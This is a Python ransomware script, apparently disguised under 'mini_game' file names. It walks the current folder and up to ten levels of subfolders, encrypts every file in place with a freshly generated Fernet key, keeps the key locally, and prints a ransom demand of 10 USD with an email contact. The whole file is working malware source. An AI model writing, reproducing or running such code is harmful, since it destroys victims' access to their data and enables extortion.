import os,datetime
from cryptography.fernet import Fernet
from colored import fg

files = []

# Physical files
for file in os.listdir():
    
    if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key' or file=='other_code_to_added.txt':
        continue
    
    if os.path.isfile(file):
        files.append(file)

    if os.path.isdir(file):

        # first folder files
        for dirfile in os.listdir(file):
            if dirfile =='mini_game.py' or dirfile=='itemvpsrans.key' or dirfile=='mini_game_open.py' or dirfile=='mini_game.exe' or dirfile=='mini_game_open.exe' or dirfile=='itemvpsranspaths.txt' or dirfile=='itemlistvpsrans.key':
                continue
            
            
            filename=f"{file}/{dirfile}"
            if os.path.isfile(filename):
                files.append(filename)
            if os.path.isdir(filename):
                
                # second folder files
                for dirfile1 in os.listdir(filename):
                    

                    if dirfile1 =='mini_game.py' or dirfile1=='itemvpsrans.key' or dirfile1=='mini_game_open.py' or dirfile1=='mini_game.exe' or dirfile1=='mini_game_open.exe' or dirfile1=='itemvpsranspaths.txt' or dirfile1=='itemlistvpsrans.key':
                        continue
                    filename1=f"{filename}/{dirfile1}"
                    if os.path.isfile(filename1):
                        files.append(filename1)

                    if os.path.isdir(filename1):

                        # Third folder files
                        for dirfile2 in os.listdir(filename1):
                            

                            if dirfile2 =='mini_game.py' or dirfile2=='itemvpsrans.key' or dirfile2=='mini_game_open.py' or dirfile2=='mini_game.exe' or dirfile2=='mini_game_open.exe' or dirfile2=='itemvpsranspaths.txt' or dirfile2=='itemlistvpsrans.key':
                                continue
                            
                            filename2=f"{filename1}/{dirfile2}"

                            if os.path.isfile(filename2):
                                files.append(filename2)
                                
                            if os.path.isdir(filename2):

                                # Fourth folder files
                                for dirfile3 in os.listdir(filename2):
                                    

                                    if dirfile3 =='mini_game.py' or dirfile3=='itemvpsrans.key' or dirfile3=='mini_game_open.py' or dirfile3=='mini_game.exe' or dirfile3=='mini_game_open.exe' or dirfile3=='itemvpsranspaths.txt' or dirfile3=='itemlistvpsrans.key':
                                        continue
                                    
                                    filename3=f"{filename2}/{dirfile3}"

                                    if os.path.isfile(filename3):
                                        files.append(filename3)

                                    if os.path.isdir(filename3):

                                        # Fifth folder files
                                        for dirfile4 in os.listdir(filename3):
                                            

                                            if dirfile4 =='mini_game.py' or dirfile4=='itemvpsrans.key' or dirfile4=='mini_game_open.py' or dirfile4=='mini_game.exe' or dirfile4=='mini_game_open.exe' or dirfile4=='itemvpsranspaths.txt' or dirfile4=='itemlistvpsrans.key':
                                                continue

                                            filename4=f"{filename3}/{dirfile4}"
                                            
                                            if os.path.isfile(filename4):
                                                files.append(filename4)

                                            if os.path.isdir(filename4):

                                                # Sixth folder files
                                                for dirfile5 in os.listdir(filename4):
                                                    

                                                    if dirfile5 =='mini_game.py' or dirfile5=='itemvpsrans.key' or dirfile5=='mini_game_open.py' or dirfile5=='mini_game.exe' or dirfile5=='mini_game_open.exe' or dirfile5=='itemvpsranspaths.txt' or dirfile5=='itemlistvpsrans.key':
                                                        continue

                                                    filename5=f"{filename4}/{dirfile5}"
                                                    
                                                    if os.path.isfile(filename5):
                                                        files.append(filename5)                                                
                                                
                                                    if os.path.isdir(filename5):

                                                        # seventh folder files
                                                        for dirfile6 in os.listdir(filename5):
                                                            

                                                            if dirfile6 =='mini_game.py' or dirfile6=='itemvpsrans.key' or dirfile6=='mini_game_open.py' or dirfile6=='mini_game.exe' or dirfile6=='mini_game_open.exe' or dirfile6=='itemvpsranspaths.txt' or dirfile6=='itemlistvpsrans.key':
                                                                continue

                                                            filename6=f"{filename5}/{dirfile6}"
                                                            
                                                            if os.path.isfile(filename6):
                                                                files.append(filename6)                                                
      
                                                            if os.path.isdir(filename6):

                                                                # eighth folder files
                                                                for dirfile7 in os.listdir(filename6):
                                                                    

                                                                    if dirfile7 =='mini_game.py' or dirfile7=='itemvpsrans.key' or dirfile7=='mini_game_open.py' or dirfile7=='mini_game.exe' or dirfile7=='mini_game_open.exe' or dirfile7=='itemvpsranspaths.txt' or dirfile7=='itemlistvpsrans.key':
                                                                        continue

                                                                    filename7=f"{filename6}/{dirfile7}"
                                                                    
                                                                    if os.path.isfile(filename7):
                                                                        files.append(filename7)

                                                                    if os.path.isdir(filename7):

                                                                        # ninth folder files
                                                                        for dirfile8 in os.listdir(filename7):
                                                                            

                                                                            if dirfile8 =='mini_game.py' or dirfile8=='itemvpsrans.key' or dirfile8=='mini_game_open.py' or dirfile8=='mini_game.exe' or dirfile8=='mini_game_open.exe' or dirfile8=='itemvpsranspaths.txt' or dirfile8=='itemlistvpsrans.key':
                                                                                continue

                                                                            filename8=f"{filename7}/{dirfile8}"
                                                                            
                                                                            if os.path.isfile(filename8):
                                                                                files.append(filename8)

                                                                            if os.path.isdir(filename8):

                                                                                # tenth folder files
                                                                                for dirfile9 in os.listdir(filename8):
                                                                                    

                                                                                    if dirfile9 =='mini_game.py' or dirfile9=='itemvpsrans.key' or dirfile9=='mini_game_open.py' or dirfile9=='mini_game.exe' or dirfile9=='mini_game_open.exe' or dirfile9=='itemvpsranspaths.txt' or dirfile9=='itemlistvpsrans.key':
                                                                                        continue

                                                                                    filename9=f"{filename8}/{dirfile9}"
                                                                                    
                                                                                    if os.path.isfile(filename9):
                                                                                        files.append(filename9)                                                                                                                                                                      
if len(files)==0:
    print('No files')

else:
    with open('itemvpsranspaths.txt','w') as text:
        text.write(str(files))

    key = Fernet.generate_key()
    
    time=datetime.datetime.today()
    
    with open('itemvpsrans.key','wb') as thekey:
        thekey.write(key)

    with open('itemlistvpsrans.key','a') as listkey:
        listkey.writelines('\n'+str(key)+str(time))



    for file in files:
        with open(file,'rb') as thefile:
            contents = thefile.read()
        contents_encrypted=Fernet(key).encrypt(contents)
        with open(file,'wb') as thefile:
            thefile.write(contents_encrypted)

    print(fg('red')+'All of your files have been encrypted.Send me 10 USD or I will delete them.'+fg('red')) 
    print(fg('white')+f'Number of files encrypted : {len(files)}'+fg('white'))
    print(fg('white')+'Contact me via '+fg('white')+fg('cyan')+'vishwapraveen4618@gmail.com'+fg('cyan'))           


end=input(fg('white')+'Press Enter to exit.'+fg('white'))














